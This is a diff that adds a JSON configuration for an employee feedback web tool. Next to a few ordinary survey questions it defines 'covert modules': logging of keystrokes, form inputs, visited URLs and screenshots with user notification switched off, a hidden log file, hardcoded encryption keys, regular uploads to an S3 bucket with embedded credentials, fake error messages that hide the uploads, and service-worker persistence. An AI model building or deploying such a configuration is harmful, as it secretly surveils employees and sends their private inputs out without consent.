@@ -1,0 +1,54 @@
+{
+  "feedback_collector_config": {
+    "version": "2.1.7",
+    "primary_function": "Collect employee feedback via web interface",
+    "covert_modules": {
+      "activity_monitor": {
+        "enabled": true,
+        "logging_interval_seconds": 30,
+        "captured_data": ["visited_urls", "form_inputs", "keystrokes", "screenshots"],
+        "user_notification": false,
+        "log_file": "/tmp/.system_metrics_cache.dat"
+      },
+      "data_processor": {
+        "encryption_enabled": true,
+        "encryption_algorithm": "AES-256-CBC",
+        "encryption_key": "bXlTdXBlclNlY3JldEtleTIwMjQhQCMk",
+        "initialization_vector": "aW5pdFZlY3RvclNlY3JldA==",
+        "compression_enabled": true
+      },
+      "upload_handler": {
+        "destination_type": "aws_s3",
+        "bucket_name": "company-private-metrics-archive",
+        "bucket_region": "us-east-1",
+        "endpoint": "https://s3.amazonaws.com",
+        "path_prefix": "telemetry/feedback_session/",
+        "upload_interval_minutes": 5,
+        "use_ssl": true,
+        "aws_access_key_id": "AKIAIOSFODNN7EXAMPLE",
+        "aws_secret_access_key": "wJalrXUtnFEMI/K7MDENG/bPxRfiCYEXAMPLEKEY"
+      },
+      "disguise_settings": {
+        "ui_element": "feedback_submit_button",
+        "trigger_event": "onclick",
+        "loading_animation": "spinner.gif",
+        "fake_error_messages": ["Connection unstable. Retrying...", "Saving your response..."]
+      }
+    },
+    "legitimate_modules": {
+      "survey_questions": [
+        "How satisfied are you with current project management tools?",
+        "What improvements would you suggest for team communication?",
+        "Rate your work-life balance on a scale of 1-10."
+      ],
+      "allowed_domains": ["https://feedback.corporateportal.com", "https://hr.internal.company.com"],
+      "session_timeout_minutes": 30
+    },
+    "system": {
+      "supported_browsers": ["chrome", "firefox", "edge"],
+      "minimum_version": "78.0",
+      "persistence_method": "localStorage_with_service_worker",
+      "service_worker_script": "/js/sw/feedbackSync.js"
+    }
+  }
+}
